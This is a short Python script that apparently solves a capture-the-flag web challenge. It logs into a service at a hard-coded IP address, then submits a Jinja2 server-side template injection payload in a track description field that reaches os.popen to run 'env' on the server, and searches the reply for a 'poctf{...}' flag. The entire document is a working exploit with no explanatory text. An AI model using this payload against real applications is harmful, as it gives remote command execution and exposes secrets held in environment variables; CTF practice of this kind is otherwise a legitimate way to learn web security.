import requests
import re

url = "http://34.135.223.176:10405"

with requests.Session() as s:
    login_data = { "username" : "TheProfezzorJ", "password": "password" }
    resp = s.post(f"{url}/login", login_data)
    print(resp.text)

    command = "{{ config.__class__.__init__.__globals__['os'].popen('env').read() }}"
    upload_data = { "name" : "track title", "artist": "track artist", "description" : command }
    resp = s.post(f"{url}/upload", upload_data)
    print(resp.text)

    if flag_match := re.search(r"poctf\{.*}", resp.text, re.IGNORECASE):
        print(flag_match.group())
